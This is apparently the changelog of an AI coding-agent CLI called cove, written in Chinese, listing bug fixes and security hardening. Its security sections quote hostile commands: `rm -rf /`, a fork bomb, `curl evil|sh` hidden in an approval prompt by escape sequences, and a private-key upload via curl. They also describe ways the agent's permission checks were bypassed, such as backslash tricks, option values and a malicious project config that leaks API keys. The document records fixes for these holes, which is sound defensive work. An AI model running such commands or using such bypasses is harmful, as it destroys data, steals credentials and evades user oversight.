  `${GIT} push`、`$env:GIT push`、`%GIT% push`、`rm${IFS}-rf${IFS}/tmp/x` 都放行（嵌套命令里的变量程序早已按
  “所有 deny/ask 都命中”处理，顶层没有）。现在一致；PowerShell 的 `%`（ForEach-Object 别名）和单独的 `$_.Name`
  不算变量程序。
- **灾难命令仍可被 `[a]`/`[p]` 记住**：`rm -rf /`、`mkfs.ext4 /dev/sda1` 会给出可记住的前缀或组（引擎会先硬拦截，
  实际走不到提示，但违反不变量）。现在灾难行不提供任何可记住规则；程序词带 `%VAR%` 的命令也不再记住前缀
  （cmd 会先展开变量，那条前缀等于放行任意程序）。

### Fixed（系统性测试发现）
- **引号里的 fork bomb 文本被误拦**：`echo ":(){ :|:& };:"`、`git commit -m ":(){ :|:& };:"` 被硬拦截；现在 fork bomb
  正则作用在去掉引号内操作符后的文本上，不带引号的写法和 `bash -c '…'`/`eval '…'` 里的照样拦。
- **git 组的 ask/deny 规则拦下只读列表命令**：`git branch -a`、`git tag`、`git stash list`、`git remote -v` 在 auto 模式
  下也会询问。手册和函数注释都写明组规则只覆盖“非只读用法”；现在只读用法先判出来直接跳过。
- **非普通文件名的会话 ID 能“保存成功”**：`..`、`/`、空串、空白、`.`、`archive/..` 等 ID 经 `filepath.Base` 后是空 key，
  Save 把它们全写进同一个列表里看不见的 `.jsonl`，`Load("..")` 还能读出来。现在保存直接报 `ErrInvalidID`
  （对 `errors.Is(err, fs.ErrNotExist)` 为真），读取/删除按“会话不存在”处理。
- **会话 ID `index` 保存会静默丢失、删除会清空所有会话的索引**：`Save("index")` 写出 `index.jsonl`，Load 却以保留 ID
  拒绝；`Delete("index")` 删掉 `index.json` 后写回空索引，其他会话的列表元数据全部丢失。现在三者都在碰磁盘前返回
  `ErrReservedID`。
- **ID 首尾带空格的会话让自动清理删错文件**：Prune 从文件名取 ID 时会 TrimSpace，`" padded .jsonl"` 被当成 `"padded "`，
  于是去删另一个（不存在的）文件并计作已删，本会话文件留着而索引条目丢失，“当前会话受保护”也失效。现在会话存储
  不再修剪 ID（只在解析用户输入 `-r`/`/resume` 时去首尾空白），Prune、目录扫描、索引三处同源取 key；两个文件都不
  存在时不计入删除数。`/history clean` 和 dream 扫描这类文件名时也不再取错 ID。
- **Windows 上含 `:` 的会话 ID 留下删不掉的临时文件**：保存虽然报错，`.cove-tmp-ab` 已作为宿主文件加数据流建出来，
  清理只删了数据流。现在含 `:` 的 key 在建任何文件之前就拒绝；`fsatomic.WriteFile` 对这类文件名同样在 CreateTemp
  之前返回错误。
- **删除当前激活的 profile 后其设置不落盘**：profile 的值仍在生效，但与加载视图比对“没有变化”，`/profile delete` 本身
  和随后 `/model <同一个值>` 都不写文件（提示却说“已保存”），下次启动悄悄回到顶层旧值。现在删除激活 profile 时，
  它设置过的键按当前生效值写到顶层，文件与运行状态一致。
- **headless 下 `/history` 的选号状态跨过普通消息**：第三轮记录为已修，实际未落盘。`/history`、一条普通消息、再输入
  `1`，`1` 仍会恢复会话；现在只有紧随 `/history` 的下一行可以选号，与 REPL 一致。
- **Anthropic 流收到 `message_stop` 后服务器不关连接被判为“流卡住”**：读循环在终止事件后继续等下一行，空闲看门狗
  超时，一个已完整的回答被当成 `stream stalled` 重试甚至回退到备用模型。现在 `message_stop` 像 OpenAI 的 `[DONE]`
  一样直接结束读取。
- Anthropic 流式与非流式对多个文本块（文本 → 工具调用 → 文本）的拼接不一致：非流式用换行连接，流式直接拼成
  `beforeafter`。现在流式在新文本块开始时同样补一个换行（回调里也能看到）。
- **Markdown 流式渲染：缩进表格在缩进处被分块时拆成两张表**：`startLine` 先因“已有表格行”结束表格，再判断“行首只有
  缩进、尚未决定是什么行”，缩进单独落在分块末尾时表格提前输出且表头不加粗。现在先等下一个字节再决定。
- **循环检测对别名工具名分开计数**：指纹用模型给的原始工具名，`Edit` 与 `edit` 交替编辑同一文件时循环检测的历史被
  拆成两份，检测阈值形同减半。指纹现在用注册表的规范名。
- **plan 模式下仍为每批写入调用建 git 快照**：plan 会拒绝全部写入，快照（约 1.5 s 一次）没有任何可供 `/undo` 恢复的
  内容。现在 plan 模式不建检查点。
- **plan 模式拒绝只读 shell 命令**：手册与 plan 门禁都规定整行只读的 `bash`/`powershell` 命令在 plan 模式可以运行，
  但引擎只在 default 模式预批准只读行，shell 工具看到 plan 就自行拒绝，门禁里放行只读行的分支从未走到，
  `git status`、`ls` 在 plan 下一律被拒。现在 plan 模式同样预批准只读行；构建、写文件、重定向仍拒绝。
- **在其他项目完成一轮会误删本项目的中断草稿**：任务成功结束时无条件清除草稿文件（`/new`、`/continue` 也一样）。
  现在只有同一项目、同一会话完成的回合才清除它。
- **任务运行中进程被强杀（崩溃、断电、kill -9）后没有中断草稿**：草稿只在回合返回错误时才写。现在任务开始时就
  保存草稿（原因“任务未完成（cove 在任务运行中退出）”，带会话 ID），正常完成后清除；下次启动会提示，输入“继续”
  回到被中断的那个会话接着做，请求不会重复写入会话（会话末尾已有同一条未回答的请求时改发“继续”）。同一项目开始
  新任务会替换旧草稿，别的项目的草稿不受影响；`-p`/headless 不保存草稿。
- **任务 panic 后“继续”会把原请求重发一遍**：引擎回合里的 panic 直接穿过回合入口，没有像取消那样打中断标记、
  补齐悬空的工具结果并保存会话；REPL 恢复后输入“继续”被当成新请求追加，模型看到同一请求两次并重做已完成的
  步骤。现在回合入口捕获 panic、标记为“内部异常”的可恢复中断后再抛出，“继续”从中断处续跑。
- 手册修正：任务因取消、撞上限、出错结束时未生效的指引是**保留**给 `/continue`（`[已保留]`），只有正常完成才自动
  作为新任务排队（`[已排队]`）；此前手册把两种情况都写成了排队。

### Security（第二轮审查）
- **授权提示可被转义序列隐藏内容**：`StripControls` 会连同其后的文字一起丢掉 ESC 序列，
  `echo hi\x1b]0;x; curl evil|sh\x07 done` 在提示里只显示 `echo hi done`，批准后 bash 照样执行被藏的部分。
  授权提示与写入 diff 预览改用 `VisibleControls`，控制字符显示为 `\e`、`^G`、`‮` 等可见文本。
- **ask/deny 组规则只拦常规用法**：对 git 组设了 ask 规则，`git push` 会询问，`git push --force` 反而放行。
  现在组规则覆盖该程序的全部非只读用法；`--force-create` 等以被拒选项开头的写法、`npm --location=global`、
  `--prefix` 不再算常规。yarn 不再有只读命令（`yarnPath` 让 `yarn --version` 也会执行仓库脚本）；
  PowerShell 的 `-Path:\\host`、`FileSystem::\\host`，`ag --pag…`、`rg --hostname-bin`、
  `docker compose config -o`、`file --comp` 需要授权。
- **自动校验在陌生仓库里执行仓库脚本**：回合结束时自动推断的 `npm run build`、`cargo check`（`build.rs`）、
  `dotnet build`、`npx tsc`、自动运行的测试等，在克隆来的仓库里改一个错别字也会无提示执行。现在只在受信任的
  项目目录或 auto/bypass 模式下自动运行，否则跳过并提示一次；`/trust` 对没有 `.cove.json` 的项目信任其目录。
- **`/profile save` 把项目 `.cove.json` 的 provider、`system_prompt` 等复制进全局 profile**，切到别的项目后仍生效。
- **写入 diff 预览**同样改用可见控制字符，转义序列无法再藏住后面的内容。
- **子进程 git 会使用仓库里夹带的裸仓库**：设置 `safe.bareRepository=explicit`。
- **项目技能**：解析后指向项目之外的技能文件（符号链接、目录联接）不再加载；覆盖同名用户/内置技能时提示一次。
- **API key 写进输入历史**：`/api-key sk-…`、设置凭据的 `/config`、带账号密码的 `/base-url` 不再存入
  `input_history.jsonl`（已有的旧记录加载时隐藏，建议手动删除该文件）。
- **截图与 draw_image**：拒绝 Windows 备用数据流路径（`main.go:x.png`）；draw_image 只写 `.png`，不覆盖非 PNG 文件。
- **`.cove.json` 为符号链接、设备或超过 1 MiB 时忽略**（以前指向 `/dev/zero` 会让启动卡死）。

### Fixed（第二轮审查）
- **Windows 上 `/restart` 的监督进程被 Ctrl+C 杀掉**（`signal.Ignore` 在 Windows 上挡不住控制台事件），
  第二次重启回到最初目录，`--replay` 被带进重启后的进程；`/trust` 在 `/cd` 之后信任的是旧目录的文件。
- **todo 计划改为客观判断**：上一版按“请求里有没有‘继续’”收起旧计划，回答模型的提问（“A”）就会丢掉计划；
  现在计划保留，只有本回合写过 `todowrite` 才发结束提示。
- **git 状态行**：只读的 `git log`/`diff` 也会触发、干净时写“已提交并推送”像是本回合推送过；
  失败或超时的 `git push`、带路径的 git 不触发。改为只在改动文件或运行会改变仓库的 git 命令后显示，措辞改为“工作区干净，与 origin/main 同步（按本地记录）”。
- **并行工具**：同一文件的不同写法（相对/绝对路径、Windows 大小写）会被两个 edit 同时写；`agent`、MCP
  工具与读操作同时运行。现在按读/写/其他三类分组、路径规范化后比较。
- **压缩**：多任务会话里 `<original_request>` 保留的是第一个任务而不是当前任务，且多次压缩会层层嵌套；
  去重占位符指向已被压缩掉的调用导致内容丢失；只裁剪时 `/compact` 误报“历史太短”。
- **验证门禁期间 Ctrl+C 被记为验证失败**；循环检测警告后每次相同输出都再次触发、很快硬停；
  `gemini-*-pro` 被当成快速模型；压缩后技能回顾停止；`shrinkForWindow` 未真正缩减也消耗重试。
- **`/undo`**：非 ASCII 文件名的新文件删不掉；Windows 上 `core.autocrlf=true` 让恢复的 LF 文件变成 CRLF；
  嵌套仓库导致中途失败且不给出回退用的备份哈希；刚 `git init` 的嵌套空仓库让检查点无法建立；
  `/undo`、`/commit` 可在任务运行中执行。
- **bash**：命令在后台留下进程（`npm run dev &`）时被判为“无法启动”并丢掉输出。
- **read**：只检查前 8KB 的编码，后面是 GBK 或含 NUL 时照样当 UTF-8 返回；非 UTF-8 大文件整读进内存。
- **webfetch**：`httpbin.org/get` 这类以 http 开头的裸域名不补协议；忽略页面字符集导致 GBK 页面乱码。
  web_search 默认的 DuckDuckGo 结果全部被丢弃（重定向链接未解开）。
- **Windows 上 write/edit 丢失文件属性**（隐藏的 `.env` 变成可见），改用 `ReplaceFileW` 保留属性、ACL 与数据流。
- **draw_image** 大半径圆或超长线段会跑几个小时且无法取消。
- **CLI**：会话结束后说“继续”可能跳到另一个历史会话；任务运行中贴图会中途换模型；`/history all 2`、
  `/history <id>` 可在任务运行中切换会话；失败请求与中断草稿会带进别的会话或项目；`@` 附件会把整条消息的
  换行压成一行，`-p` 的管道输入里出现 `@babel/core` 就失败；`-p` 管道 3 秒没数据就静默丢弃；
  headless 永远以 0 退出、斜杠命令期间的 SIGTERM 不结束运行；`/skill create` 覆盖已有技能；
  回答刚显示、回合还在收尾时输入“继续”会被拒绝（“当前有任务正在运行”），现在按普通输入送入任务或排队。
- **API**：多 key 池里一个 key 失效（401）就让整轮失败或把整个供应商拉黑；切到备用供应商后再也不回主供应商；
  中途失败的流式请求不计费；流停滞被当成未知错误；等待响应头超时被重试 3 次（本地最长约 1 小时）。
- **记忆**：中文检索几乎匹配不到（整段中文被当成一个词）；一个超长记忆让语义检索永久失效；
  整理与另一进程的记忆提取并发写同一文件时丢内容；整理用的 grep 可能把大文件整读进内存；
  修剪会话时不删 `archive/` 归档；整理完成后同一会话 1 小时内 `/dream run` 被拒；整理先报告“已结束”
  才写锁文件的完成标记，紧接着的 `/dream run` 或清理会与写锁撞上。
- **会话**：保存后的 stat 可能把另一进程追加的内容当成自己的，之后改写时丢掉且不归档。
- **技能与 hook**：`paths: src/api/*.go` 这类含目录的模式永远不匹配；CRLF、BOM、YAML 列表的 frontmatter
  解析错误；hook 的 `matcher` 区分大小写，从 Claude Code 复制来的 `"Bash"` 永远不触发。
- **界面**：流式清洗器在超长未结束的转义序列上是平方复杂度（160KB 卡 3 秒）；只改了结尾换行或换行符的
  写入显示“内容不变”；表格不支持 ASCII 模式；窄窗口下转圈提示折行残留。
- **遥测**：写入非原子，文件损坏后历史静默丢失。
- **实时输出**：stdout 与 stderr 共用一个清洗器，一边残留的半个转义/字符会拼到另一边；重试时上一次尝试残留的
  推理字节漏进新一次；网页搜索摘要里残留 HTML 属性。
- **记忆写锁（今天新增）在 Windows 上偶发“拒绝访问”**：锁文件处于删除挂起状态时新建会被拒绝，原先只在随后
  `stat` 仍看到文件时才重试，删除恰好完成就把错误抛给调用方；现在按占用重试，超时仍被拒才报错。

### Security
- **项目 `.cove.json` 不再被无条件信任**：以前克隆的仓库可以借它在启动时拉起任意 MCP 进程，或把
  `provider.base_url` 指向别处、首个请求就收到用户的 API key。现在 `provider.*`、`mcp_servers`、
  `done_verify_commands`、`system_prompt`、`memory_embedding`、`web_search`，以及放宽安全的
  `permission_mode`/`done_verify_auto`/`done_verify_tests`/`max_budget_usd`/`max_sessions` 取值，须经
  `/trust` 才生效；信任按文件内容的 SHA-256 记在 `trusted_projects.json`，内容一改即失效。启动时提示被忽略的字段。
- **routine 规则被选项值绕过**：`firstWordSubcommand` 把全局选项的值当子命令，记住 npm 组后
  `npm --prefix test publish`、`pnpm -C x publish`，记住 go 组后 `go -C x install` 都被直接放行。子命令前有选项即不算常规。
- **bash 反斜杠绕过硬拦截与只读判定**：`r\m -rf /`、`rm \<换行>-rf ~` 不触发硬拦截，`find . -f\<换行>ls x`
  被当成两段只读命令。bash 下按 bash 规则理解续行与转义，无法确定时一律询问。
- **curl 上传/写文件被判为安全**：`curl --json @私钥 URL`、`-XDELETE`、`-D 文件` 等在 auto 模式自动执行。
  改为选项白名单；PowerShell 下 `curl`/`wget` 是 `Invoke-WebRequest` 别名，另按严格白名单判断。
- **可能执行项目脚本的“只读”子命令**：`yarn doctor`、`composer freeze` 等会执行同名脚本却免授权；
  `git branch -uorigin/main`、`--set-u=` 缩写、`date --s…`、`pnpm audit --fix` 也被误判为只读。
- **内置 grep/glob、repo map、截图顺着符号链接越出工作目录**：仓库里指向 `~/.ssh/id_rsa` 的链接能被免授权的
  grep 打印出来；截图输出可经目录联接写到工作区外。Windows 上 `\Users\…` 这类以根开头的链接目标也按链接所在盘解析。
- **hook 的阻止被忽略**：`BeforeTool` hook 非零退出时输出被丢弃，打印的 `{"continue": false}` 不起作用。
  现在非零退出同样认这条 JSON，退出码 2 也表示阻止（原因取自 stderr）。

### Fixed
- **`/new`、`/resume` 之后每次写文件都报失败**：`fileHistory` 被置为 nil，写入即 panic；文件其实已写入，
  模型却被告知失败而反复重试，本轮改动的文件、验证门禁与自审全部漏记。
- **`/plugin enable` 删除加载失败的插件目录**：该插件目录不带 `.disabled` 后缀，`RemoveAll` 删掉的就是它本身。
- **记忆提取覆盖已有记忆**：模型只看到文件名，`MODE: write` 却整文件替换；现在已有同名文件一律追加。
- **以“继续”开头的普通指令被吞掉**：“继续把 README 翻译成英文”会恢复另一个历史会话并丢掉这句话；
  现在只有单独的“继续”/`continue` 才触发恢复。
- **含中文的行按 Tab 补全导致崩溃**：补全后光标按字节计算，超出按字符计数的缓冲区。
- **Ctrl+D 退出不停止运行中的任务**，也不回答正在等待的授权提示；输出流进行中退出时终端滚动区域未复位。
  所有退出路径（Ctrl+D、`/exit`、`/restart`）现在走同一个流程。
- **同一批工具调用里读写并行**：`[edit P, read P]` 可能读到修改前或写了一半的文件；现在读写分组先后执行。
- **只裁剪的压缩反复把任务列表追加到用户第一条消息**。
- **子代理与记忆整理的 `max_tokens` 写死为 16000**，deepseek-chat 等输出上限 8192 的模型每次 400。
- **流式空闲超时把建连与 429 重试等待也算进去**：本地模型长提示预填充超过 180 秒即被当成“用户取消”；
  流式路径上被限流的 key 也不会冷却。
- **两个 cove 进程写同一会话互相抹掉对方的回合**：覆盖前先把磁盘上的版本存进 `archive/`。
- **记忆整理锁非原子**，两个后台整理进程可能同时持锁；整理与每轮记忆提取并发写同一文件时丢内容；
  整理用的 grep 静默跳过大文件和超长行；清空的计划仍留在会话笔记里。
- **profile**：保存任一 profile 会丢掉其他 profile 的 `max_turn_minutes` 等字段；激活 profile 时 `/model`、
  `/api-key` 等修改写到顶层，重启后被 profile 覆盖回去，现在写回该 profile。
- 任务运行中输入 `/history` 后的编号、`/base-url <地址>` 不再能改写正在使用的会话；headless 下 SIGTERM
  结束整个运行，每轮不再泄漏一个 goroutine。
- edit 模糊匹配把 CRLF 文件改成混合换行；流式输出跨分块的中文被截坏（含结尾半个字）；从文件开头插入时
  diff hunk 头行号错误；Ctrl+R 无匹配时仍保留旧匹配；光标不在行尾时提示行溢出折行。
- `team_delete a` 连带删除 `a-b` 队的成员；两个插件同名命令的胜出方随机；市场安装可能复制别的市场的同名插件；
  大小写不同的插件名安装成功却报错；`depends: a, b` 带空格时依赖被丢弃；read 结果的 `[next: offset=N]`
  不再被 guardrail 警告挤到非末行；停滞提示不再带光标控制码。
- **技能市场从未真正可用**：`RegistryURL` 指向的 `skills-registry.json` 从未提交过（远端 404），
  一直静默回退到内置列表，而内置列表的 5 个条目都没有 `url`；`/skill install` 又丢弃了
  `InstallSkill` 的错误，结果是只写了一个占位 `SKILL.md` 却提示"成功安装"。现在补上
  `skills-registry.json` 与 `skills/<name>/SKILL.md`（security-audit、api-design、dockerize、
  i18n、ci-cd），内置回退列表与之保持一致（有测试锁定）；拉取注册表时检查 HTTP 状态码；
  安装/创建失败如实报错，市场里没有的名字不再偷偷建空模板（改提示 `/skill create`），
  安装成功的提示改为"重启后可用"（技能在引擎启动时加载）。

- **任务总结混进上一个无关任务**：`todowrite` 的列表在整个会话里一直有效，上一个任务留下的
  未完成项会跟着下一个无关请求——每 8 轮作为“你的任务列表”重新提醒，结束时 `todoFinishNudge`
  还要求“做完这些项并完整重写报告”，两个任务的总结于是混在一起。现在列表照常保留（回答模型的提问、
  `/resume` 后的第一句话都不会丢计划），但只有本回合调用过 `todowrite` 时才发结束前的“做完再重写报告”
  提示，周期提醒对本回合没碰过的旧列表注明“只有最近的请求属于那项工作时才继续”。系统提示词
  “Reporting back” 与退化结尾、完成前自检、收尾总结、todo 收尾提示都限定为“最近这条请求”。
- **总结没说清是否已提交/推送**：系统提示词要求在 git 仓库里改了文件时说明是否已提交、已推送，
  没执行的不能写得像做过，列给用户的命令要说明是给用户的步骤；收尾总结提示同样要求。另外引擎在
  本轮改过文件或跑过 `git` 时，于最终报告下方显示一行来自 `git status` 的暗色状态（未提交 N 个文件 /
  M 个提交未推送 / 没有上游 / 已推送），不依赖模型自述。

### Changed
- 文档里 clone 后的 `cd cove`、`cd cove/agent` 统一为 `cd cove-agent`（仓库更名遗漏）。
- **授权提示去掉多余文字**：无法按规则记住的命令不再显示黄色的“这一行无法按规则记住：…。按 y
  允许本次，n 拒绝”（选项里没有 `[a]` 已说明这一点，后半句又重复了选项行）；“已记住的规则未覆盖
  这一行”的说明保留，改为暗色并去掉重复的后半句；“按键即答…”只在本进程第一次询问时显示。

## [11.7.0] - 2026-09-30

### Added
- **仓库更名为 cove-agent**：GitHub 仓库、Go 模块路径（`github.com/liuzhixin405/cove-agent`）、
  文档与徽章链接、技能市场 RegistryURL 全部统一；旧地址 301 重定向，但
  `raw.githubusercontent.com` 不重定向，因此代码里的地址必须同步改。
- README 插入两张真实会话截图，并补回命令行速查表（此前改版时被删，但
  "每个已注册命令都要出现在 README 与 USER_MANUAL" 的检查一直要求它在）。

### Fixed
- **编译回归**：go.mod 的模块路径被上一次改名误写成 `cove-agent-agent`（重复
  `-agent`），与 741 个 Go 文件的 import 不一致，`go build ./...` 全报
  "no required module provides package"，CI 的 Test 三平台与 Build Check 全红。
- **CI Lint 从未真正运行**：钉住的 golangci-lint v2.1.6 是用 Go 1.24 构建的，
  面对 go 1.25.0 的模块直接以 exit 3 退出；升到 v2.4.0 并修掉它报出的 26 条
  问题（死代码、errorlint、遮蔽内建标识符、G115 整数转换等）。
- **repl 里与 os.Stdout 的数据竞争**：分离的 pin goroutine（pinIfStreaming /
  pinAtCursor）此前没有任何可等待的边界，-race 下在 ubuntu/macOS 上必然报错；
  现在经 pinWG 归口，waitForPin() 可等待。
- **三平台测试假设**：依赖 Windows 路径形态（`D:\...`）、符号链接权限、以及
  "整行以绝对路径开头" 的用例，改为按平台成立；checkpoint 的周期性 GC 测试
  不再依赖后台 goroutine 的调度时机（macOS runner 上偶发失败）。
- NO_COLOR 相关用例不再受外部环境影响：Cove 给工具 shell 设的就是
  `NO_COLOR=1`，此前在 Cove 会话里跑 `go test ./...` 必红。

### Changed
- **repo map 改为增量索引 + 引用图 PageRank**：
  - 新增 `repomap.Index`，每个工作区一份，repo_map 工具、首轮 excerpt 和 `/context` 共用。每次查询都重新遍历目录，但只重新解析 mtime 或大小变了的文件。
  - 排序改为跨文件引用图上的 PageRank（参照 Aider）。以前的分数只统计出现在别的文件函数签名里的名字，函数体里的调用都不算。现在统计所有标识符引用；定义在很多文件里的名字，以及私有名字，降低权重。
  - 带关键词的查询会多出「Related by references」一段：以命中文件为种子，在双向引用图上跑个性化 PageRank，列出它们的调用方和被调用方。
  - 新增 C#、Java、Rust 的定义提取；TS/JS 新增箭头函数常量、`type`、`enum`。
  - 删除 `EnhancedGenerator`：它的 `GenerateIncremental` 从来没被调用过。同时删除全局的 `parseCache`，它按路径缓存且从不清理。
- **长任务不再丢计划**：
  - 任务清单还有未完成项、且连续 8 轮工具调用没有调用 todowrite 时，把当前清单附在这一轮最后一个工具结果后面。
  - 压缩时把清单写进摘要消息，恢复会话时从最后一次 todowrite 调用重建清单。
  - `/new` 会清空清单，以前旧任务的清单会带进新会话。todo 记录新增 `Priority` 字段。
- **子代理获得项目上下文**：agent 工具和 execute_plan 启动的子代理，系统提示除了角色说明，还会带上工作目录、平台、shell、git 分支、项目概览、项目指令文件（CLAUDE.md、AGENTS.md、.cove.md）和用户自定义指令，总量按窗口预算截断。以前只有一行角色说明。
- **子代理会裁剪上下文**：请求超过主模型的压缩阈值时，除最近 6 个工具结果外，其余工具结果裁到 400 字节。以前 60 轮、每轮 32KB 的结果会撑爆上下文窗口，子代理因上下文超长报错，已完成的工作也一起丢掉。

### Added
- **完成校验会跑改动涉及的测试**（`done_verify_tests`，默认开启）：
  - 以前自动校验只做编译检查，逻辑错误拦不住。
  - 现在编译通过后，只针对本轮改过的文件跑对应测试：Go 跑所在包的 `go vet` 和 `go test`，.NET 跑相关测试项目的 `dotnet test`，Python 跑对应的 `pytest` 测试文件。
  - 失败时和编译失败一样打回给模型修改。
- **跨会话接续未完成的计划**：
  - todowrite 的清单只要还有未完成项，就会写入项目的 session notes（`## Unfinished Plan` 段）。
  - 已完成的项记为 Tasks 进度日志；`AddTask` 以前从没被调用过，现在用上了。
  - 同一项目的下一个会话，第一轮会收到 `<previous_plan>`，由模型判断是否接着做。7 天前的计划不再提示，全部完成后清单自动清除。
- **完成前自审**（`done_self_review`：`off` 默认 / `on` / `auto`）：
  - 本轮改过文件、并通过校验后，由只读的 review 子代理审一遍本轮 diff（git diff HEAD，未跟踪的新文件附上全文）。
  - 发现问题就交回模型修改，每轮最多一次。
  - `auto` 只审改动 40 行及以上的轮次。
- **dream 整理前检查记忆是否失效**：
  - 逐条检查项目记忆里提到的路径和反引号内的代码符号，在项目源码和配置文件中找不到的，就在记忆的 frontmatter 下加一行 `> [stale-check 日期] Not found in the project any more: …`。
  - 以后读到这条记忆时，模型会看到这行提醒；引用恢复可以找到后，这行会自动移除。
  - 整理提示里会列出这些记忆，交给 dream 修正或删除。
  - 只检查指向项目内的路径；搜索范围不包含 .md 和 .txt 文件，这样 CHANGELOG 里提到已删除的名字，不会被当作仍然存在。

### 交互 / UI
- **工具输出可以展开**：
  - 有折叠内容的工具块，标题后会显示 `#N`。用 `/x N` 展开对应块，`/x` 展开最近一个，`/x N all` 显示全部（默认最多 200 行）。
  - 以前 ▸ 标记暗示可以展开，但前端把完整输出和块 ID 都丢了，实际展不开。
  - 耗时超过 1 秒的步骤会显示用时。
- **edit/write 显示 diff**：
  - 摘要行改为 `+12 −3`，`/x` 展开后是彩色 unified diff。
  - 授权提示也会在路径下方预览这次改动，最多 40 行。
- **计划可见**：todowrite 的结果直接画成清单（✓ 已完成、▶ 进行中、○ 未开始，外加「2/5 完成」），不再只有一行 "Task list (N items)"。
- **状态行**：
  - 运行中，spinner 后显示已用时间、上下文占用和本轮费用。
  - 每轮结束打印一行汇总：用时、输入/输出 token、费用、上下文占用。
  - `/context` 新增上下文占用一项。
- **子代理进度**：agent / execute_plan 的子代理在开始、每个工具步骤和结束时各打印一行，以前运行过程中完全没有输出。
- **提示单键作答**：
  - 授权（y/a/p/n）、上限（c/s）按键即生效，不用再按回车。
  - 提问可以直接按 1–9 选择，也可以用 ↑↓ 挑选后回车。
- **输入编辑**：
  - 新增快捷键：Ctrl+A/E/U/K/W，Ctrl+←/→ 和 Alt+B/F 按词移动，Alt+Backspace，Ctrl+R 搜索历史。
  - 换行：Ctrl+J、Alt+Enter，或在行尾输入 `\` 再回车。多行或超长输入会分多行显示（最多 12 行）。
  - 输入历史保存在 `input_history.jsonl`，重启后仍可用。
  - Tab 可补全 `@路径`。
  - 新增 `/keys`，列出全部快捷键。
- **Esc 中断**：输入行有内容时，Esc 清空输入；输入行为空时，Esc 中断当前任务。`COVE_ESC_INTERRUPT=0` 可关闭。
- **回答渲染**：
  - 代码块按语言高亮（Go、Python、JS/TS、C#、Java、Rust、Shell、SQL、JSON）。
  - Markdown 表格按列对齐，用框线绘制。
  - 遵守 `NO_COLOR`：设置后输出不带颜色，光标控制不受影响。
- **提示统一为中文**：停滞提示（「调用模型」「执行工具」）、完成校验、拦截、退出，以及「请求失败」等提示中残留的英文已改为中文。

### Fixed（Gemini 实测发现）
- **Gemini 3 调用工具后下一次请求报 400**（"Function call is missing a thought_signature"）：
  - Gemini 3 系列在 tool call 的 `extra_content` 里返回思考签名，下一次请求必须原样带回。以前这个字段被丢掉了，所以只要调用过一次工具，后续请求就会失败。
  - 现在 `ToolCall.Extra` 会原样透传，流式和非流式都支持，并随会话一起保存，恢复会话后仍然有效。
- **429 时不遵守服务端要求的等待时间**：Gemini 的 OpenAI 兼容接口不带 `Retry-After` 响应头，等待时间写在响应体里（`retryDelay` / "Please retry in 43s"）。现在会从响应体里解析这个时间。重试等待超过 5 秒时，会显示「请求被限流（429），43 秒后自动重试（第 1/3 次）」，不再被误报为「可能卡住」。
- **模型过载或额度用尽时整轮失败**：重试之后仍然返回 503 或 429 时，本轮自动改用另一个已配置的模型（主模型和 fast 模型互为备用），每轮最多切换一次。
- **`-p` 和 headless 模式下，模型进入 plan 模式后出不来**：退出 plan 模式需要用户批准，而非交互模式下没有人能批准，于是之后的编辑和命令全部被拒。现在只在交互模式下注册 `plan_mode` 和 `exit_plan_mode`。
- **PowerShell 管道输入带 BOM**：Windows PowerShell 5 通过管道传给程序的文本开头带 UTF-8 BOM，`/context` 实际变成了 BOM + `/context`，不再被识别为命令，而是作为普通消息发给了模型。现在 headless 模式和 `-p` 的管道输入会先去掉 BOM。
- **上次未完成的计划被模型自行接手**：以前每个新会话的第一轮都会把旧计划交给模型，模型收到一条无关的消息，也会把旧任务重做一遍。现在只有用户明确说要继续（「继续」「接着」「上次」「continue」等）时，旧计划才会交给模型；否则只给用户显示一行提示。
- **做完了却没勾掉计划**：回合结束时如果任务清单里还有未完成项，会提醒模型一次，让它更新清单或继续做完，并重新写出完整报告。以前模型做完任务后常常把所有项都留在未完成状态，下次会话就被当作"未完成的计划"。
- **启动慢**：在 git 仓库里启动时，项目上下文要调用 6 次 git（Windows 上每次 0.4 到 0.6 秒，部分还是串行的），这一步要 3 秒左右。现在仓库根目录、当前分支、主分支都直接从 `.git` 读取，git 只用来获取 status、log 和 user，而且三者并行执行，这一步降到约 1 秒。每轮刷新 git 状态时读取分支也不再启动 git 进程。用 `-d` 可以看到启动各阶段的耗时（`[startup] …`）。
- **工具块显示不准确**：
  - shell 命令退出码非零时，摘要行显示为 ✗ 并带上退出码。以前「✓ --- FAIL: TestX」看起来像是通过了。
  - shell 命令的摘要改为显示命令输出的第一行，而不是回显的「Command: 描述」。
  - read 的摘要改为「N 行」，不再显示绝对路径。
- **shell 命令半分钟没有输出就被报「可能卡住」**：shell 命令的停滞阈值从 30 秒改为 2 分钟，构建或测试在这段时间内没有输出是正常的。
- **聊天回合也打印「完成校验命令」**：改为在第一次真正执行校验时才打印。
- **命令失败的摘要只显示 `[stderr]`**：「退出码 127 · [stderr]」把真正的错误 `gh: command not found` 藏在了标记后面。现在摘要会跳过 `[stderr]`、`[exit …]` 这类标记行。
- **子代理失败了却显示 ✓**：agent 工具的结果以 `[exit: error …]` 开头时，工具块显示为 ✗，摘要显示失败原因。
- **子代理遇到 503 直接失败**：子代理和主循环一样，模型过载或额度用尽时改用备用模型一次，进度里会显示「模型 X 不可用，改用 Y」。
- **检查工具是否安装也要授权**：`git --version`、`command -v gh` 现在归为只读命令，不再弹出授权提示。
- **自审子代理联网搜索**：review 类型的子代理不再提供 websearch、webfetch、browser 工具。实测中它为了确认中位数的定义搜索了 7 次。
- **`/技能名 参数` 不执行技能**：以前只打印技能内容和「无效的参数」，什么都不执行。现在会把技能说明和参数作为任务发送，行为与插件命令一致。
- **压缩和清空会话时保留原始对话**：重写会话文件前，如果新的历史会丢掉已写入的消息，先把原文件存到 `sessions/archive/<id>/`，每个会话最多保留 5 份。以前压缩直接覆盖 `<id>.jsonl`，原始对话无法找回。删除会话时这些存档一并删除。

### Removed
- `internal/repl/color.go` 里重复实现的 Spinner、WalkingIndicator、授权框、工具行和 Banner。这些都没有被调用，保留 termui 中的那一份。
- 死代码 `taskDecompositionGuidance` 和 `weakModelGuidance`：只有测试调用。每轮注入的规划提示和弱模型提示之前已按设计移除（见 `turn.go` 中 `turnContextNote` 的注释），这两个函数只是残留。

## [11.5.0] - 2026-09-28

### Added
- **`/clear`（别名 `/cls`，快捷键 Ctrl+L）**：清屏并清空回滚区，不影响对话上下文；任务输出中不清屏（会抹掉固定输入行与滚动区域），提示任务结束后再试。
